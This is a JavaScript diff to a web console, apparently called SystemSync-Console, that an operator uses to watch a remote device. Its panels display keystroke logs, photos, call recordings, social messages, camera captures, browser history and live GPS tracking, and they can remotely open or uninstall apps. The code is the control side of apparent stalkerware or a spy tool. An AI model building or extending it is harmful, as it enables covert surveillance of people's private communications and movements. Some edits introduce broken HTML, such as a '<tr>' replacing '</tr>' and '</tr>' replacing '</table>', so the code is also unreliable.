@@ -945,7 +945,7 @@ async function showCallRecordingsPanel() {
     }
 }
 
-// ==================== PHOTO GALLERY ====================
+// ==================== PHOTO GALLERY (FIXED – no index required) ====================
 async function showPhotoGalleryPanel() {
     if (!selectedDeviceId) {
         panel.innerHTML = '<p>No device selected.</p>';
@@ -958,19 +958,22 @@ async function showPhotoGalleryPanel() {
     panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><p>Loading photos from Firebase...</p>';
     try {
         let snapshot = null;
+        let docs = [];
+        // Try subcollection first
         try {
             snapshot = await db.collection('devices').doc(selectedDeviceId).collection('photos')
-                .orderBy('timestamp', 'desc')
                 .get();
+            docs = snapshot.docs;
         } catch(e) {}
-        if (!snapshot || snapshot.empty) {
+        if (!docs.length) {
+            // Top‑level collection – NO orderBy to avoid index requirement
             snapshot = await db.collection('photos')
                 .where('deviceId', '==', selectedDeviceId)
                 .where('userId', '==', currentUser.uid)
-                .orderBy('timestamp', 'desc')
                 .get();
+            docs = snapshot.docs;
         }
-        if (snapshot.empty) {
+        if (docs.length === 0) {
             panel.innerHTML = `
                 <h3>🖼️ Photo Gallery</h3>
                 <p>No photos found in Firebase. You can fetch recent images directly from the device (if available).</p>
@@ -982,10 +985,16 @@ async function showPhotoGalleryPanel() {
             });
             return;
         }
+        // Sort client-side by timestamp (descending)
+        docs.sort((a, b) => {
+            const tsA = a.data().timestamp || 0;
+            const tsB = b.data().timestamp || 0;
+            return tsB - tsA;
+        });
         let html = '<h3>🖼️ Photo Gallery (Firebase)</h3><div class="photo-grid" id="photoGrid"></div>';
         panel.innerHTML = html;
         const grid = document.getElementById('photoGrid');
-        snapshot.forEach(doc => {
+        docs.forEach(doc => {
             const photo = doc.data();
             const imageUrl = photo.imageUrl;
             const timestamp = photo.timestamp ? new Date(photo.timestamp).toLocaleString() : '';
@@ -1081,10 +1090,8 @@ async function loadAppUsageFromFirebase(days) {
     if (!container) return;
     container.innerHTML = '<p>Loading...</p>';
     try {
-        // Calculate date range
         const now = new Date();
         const cutoff = new Date(now.getTime() - days * 86400000);
-        // Query app_usage subcollection for the device
         const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
             .where('timestamp', '>=', cutoff)
             .orderBy('timestamp', 'desc')
@@ -1093,8 +1100,7 @@ async function loadAppUsageFromFirebase(days) {
             container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
             return;
         }
-        // Aggregate usage by app across all retrieved days
-        const appTotals = new Map(); // appName -> total ms
+        const appTotals = new Map();
         snapshot.forEach(doc => {
             const data = doc.data();
             const apps = JSON.parse(data.apps);
@@ -1114,7 +1120,6 @@ async function loadAppUsageFromFirebase(days) {
             container.innerHTML = '<p>No usage data for the selected period.</p>';
             return;
         }
-        // Sort by total time descending
         const sorted = Array.from(appTotals.entries()).sort((a,b) => b[1] - a[1]);
         const max = sorted[0][1];
         let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
@@ -1140,10 +1145,8 @@ async function loadAppUsageFromFirebase(days) {
 }
 
 // ==================== ENHANCED MAP WITH FOLLOW CHECKBOX ====================
-// This function creates a persistent map that updates marker and info without refreshing the whole page
 function renderLiveMap(lat, lon, acc) {
     if (!liveMap) {
-        // First time – create map container
         panel.innerHTML = `
             <div style="position:relative;">
                 <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
@@ -1159,7 +1162,6 @@ function renderLiveMap(lat, lon, acc) {
                 </label>
             </div>
         `;
-        // Create the map
         const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '&copy; OpenStreetMap contributors'
         });
@@ -1171,10 +1173,8 @@ function renderLiveMap(lat, lon, acc) {
         liveMap.currentTileLayer = streetLayer;
         liveMap.satelliteLayer = satelliteLayer;
         liveMap.streetLayer = streetLayer;
-        // Add marker and circle
         liveMarker = L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(liveMap).bindPopup('Device Location');
         liveCircle = L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(liveMap);
-        // Toggle map type
         document.getElementById('liveMapTypeToggle').addEventListener('click', () => {
             if (currentMapType === 'street') {
                 liveMap.removeLayer(liveMap.currentTileLayer);
@@ -1190,11 +1190,9 @@ function renderLiveMap(lat, lon, acc) {
                 document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
             }
         });
-        // Follow checkbox event
         document.getElementById('followLocationCheck').addEventListener('change', (e) => {
             followLocation = e.target.checked;
         });
-        // Initial reverse geocode
         fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
         })
@@ -1208,13 +1206,11 @@ function renderLiveMap(lat, lon, acc) {
             document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
         });
     } else {
-        // Update existing marker, circle, and info
         liveMarker.setLatLng([lat, lon]);
         liveCircle.setLatLng([lat, lon]);
         liveCircle.setRadius(acc);
         document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
         document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
-        // Update address (reverse geocode again, but do it asynchronously)
         fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
         })
@@ -1245,7 +1241,7 @@ function renderTable(rows, headers) {
     pageRows.forEach(r => {
         html += '<tr>';
         r.forEach(cell => html += `<td>${escapeHtml(cell || '')}</td>`);
-        html += '</tr>';
+        html += '<tr>';
     });
     html += '</tbody></table></div>';
     if (totalPages > 1) {
@@ -1342,7 +1338,7 @@ function displayWifiNetworks(data) {
 
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th><tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></tr></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
@@ -1354,7 +1350,7 @@ function displayBrowserHistory(data){
 
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
 
@@ -1452,10 +1448,8 @@ function toggleLiveGps(){
         btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track';
     }
     if(liveGpsActive && currentLocation){
-        // If already have a location, create the persistent map
         renderLiveMap(currentLocation.lat, currentLocation.lon, currentLocation.acc);
     } else if(!liveGpsActive){
-        // Optionally clear the map from panel
         panel.innerHTML = '<p>Live GPS tracking stopped.</p>';
         liveMap = null;
         liveMarker = null;
@@ -1484,7 +1478,6 @@ function handleJSON(json){
         case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
         case 'LOCATION_UPDATE': 
-            // Update the persistent map if live GPS is active
             if(liveGpsActive) {
                 const loc = json.data || json;
                 const lat = loc.lat || loc.latitude;
@@ -1497,7 +1490,6 @@ function handleJSON(json){
                     renderLiveMap(lat, lon, acc);
                 }
             } else {
-                // Fallback to the old one‑time map (not used during live tracking)
                 renderMap(json.data||json);
             }
             break;
